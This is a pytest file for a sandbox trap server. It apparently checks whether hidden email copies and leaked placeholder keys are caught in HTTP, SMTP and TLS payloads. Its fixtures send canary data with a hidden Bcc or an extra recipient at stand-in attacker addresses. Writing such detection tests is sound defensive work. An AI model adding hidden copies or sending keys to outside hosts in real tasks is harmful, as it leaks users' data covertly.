"""Protocol fixtures prove hidden copies appear in payload evidence, not just DNS."""

import importlib.util
import json
import smtplib
import threading
import urllib.request
from pathlib import Path

SPEC = importlib.util.spec_from_file_location(
    "histor_sink", Path(__file__).parents[1] / "sandbox/histor_sink.py"
)
sink = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(sink)


def test_http_postmark_bcc_and_isolation():
    collector = sink.Collector()
    server = sink.HTTPTrap(("127.0.0.1", 0), sink.HTTPHandler)
    server.collector = collector
    threading.Thread(target=server.serve_forever, daemon=True).start()
    try:
        payload = json.dumps(
            {
                "To": "canary-fixture@histor-trap.invalid",
                "Bcc": "copy@attacker.invalid",
                "TextBody": "fake data",
            }
        ).encode()
        response = urllib.request.urlopen(
            urllib.request.Request(f"http://127.0.0.1:{server.server_port}/email", data=payload), timeout=3
        )
        assert json.load(response)["ErrorCode"] == 0
        phase = collector.phase("127.0.0.1", 0, 9999999999, "fixture")
        assert phase["unexpectedRecipients"] == ["copy@attacker.invalid"] and phase["complete"]
        assert collector.phase("other", 0, 9999999999, "fixture")["requests"] == []
        assert not collector.phase(None, 0, 9999999999, "fixture")["complete"]
    finally:
        server.shutdown()
        server.server_close()


def test_smtp_hidden_copy_and_unparseable_http():
    collector = sink.Collector()
    server = sink.SMTPTrap(("127.0.0.1", 0), sink.SMTPHandler)
    server.collector = collector
    threading.Thread(target=server.serve_forever, daemon=True).start()
    try:
        with smtplib.SMTP("127.0.0.1", server.server_address[1], timeout=3) as smtp:
            smtp.sendmail(
                "sender@fixture.invalid",
                ["canary-fixture@histor-trap.invalid", "copy@attacker.invalid"],
                "Subject: test\n\nhistor-canary-ssh-fixture",
            )
        phase = collector.phase("127.0.0.1", 0, 9999999999, "fixture")
        assert phase["unexpectedRecipients"] == ["copy@attacker.invalid"] and phase["decoyTransmitted"]
        collector.record("127.0.0.1", "http", "fixture", b"opaque compressed payload")
        assert not collector.phase("127.0.0.1", 0, 9999999999, "fixture")["complete"]
    finally:
        server.shutdown()
        server.server_close()


def test_tls_payload_capture_with_private_trap_ca(tmp_path):
    import ssl

    certs = sink.Certificates(tmp_path)
    collector = sink.Collector()
    server = sink.HTTPTrap(("127.0.0.1", 0), sink.HTTPHandler)
    server.collector = collector
    server.socket = certs.context("localhost").wrap_socket(
        server.socket, server_side=True, do_handshake_on_connect=False
    )
    threading.Thread(target=server.serve_forever, daemon=True).start()
    try:
        ctx = ssl.create_default_context(cafile=str(tmp_path / "ca.pem"))
        data = json.dumps({"to": "canary-test@histor-trap.invalid", "bcc": "copy@extra.invalid"}).encode()
        with urllib.request.urlopen(
            urllib.request.Request(f"https://localhost:{server.server_port}/email", data=data),
            context=ctx,
            timeout=5,
        ) as response:
            assert response.status == 200
        assert collector.phase("127.0.0.1", 0, 9999999999, "test")["unexpectedRecipients"] == [
            "copy@extra.invalid"
        ]
    finally:
        server.shutdown()
        server.server_close()


def test_a_placeholder_key_is_traced_to_where_it_went_not_called_theft():
    collector = sink.Collector()
    server = sink.HTTPTrap(("127.0.0.1", 0), sink.HTTPHandler)
    server.collector = collector
    threading.Thread(target=server.serve_forever, daemon=True).start()
    try:
        req = urllib.request.Request(f"http://127.0.0.1:{server.server_port}/v1/search",
                                     data=json.dumps({"api_key": "histor-envkey-r1", "q": "x"}).encode())
        urllib.request.urlopen(req, timeout=3).read()
        phase = collector.phase("127.0.0.1", 0, 9999999999, "r1")
        assert phase["envKeyDestinations"] and not phase["decoyTransmitted"]
    finally:
        server.shutdown()
        server.server_close()


def test_a_request_from_the_addresses_previous_holder_is_not_this_runs():
    import importlib.util
    from pathlib import Path

    spec = importlib.util.spec_from_file_location("sink_under_test", Path(__file__).parents[1] / "sandbox/histor_sink.py")
    sink = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(sink)
    collector = sink.Collector() if hasattr(sink, "Collector") else None
    if collector is None:
        import pytest
        pytest.skip("collector class not exposed")
    collector.record("10.231.0.7", "smtp", "smtp", b"x", recipient_list=["canary-aaaaaaaaaaaa@histor-trap.invalid"], opened=100.0)
    collector.records[-1]["at"] = 205.0  # finished after the next container got the address
    assert collector.phase("10.231.0.7", 200.0, 300.0, "bbbbbbbbbbbb")["requests"] == []
    assert collector.phase("10.231.0.7", 50.0, 150.0, "aaaaaaaaaaaa")["requests"]
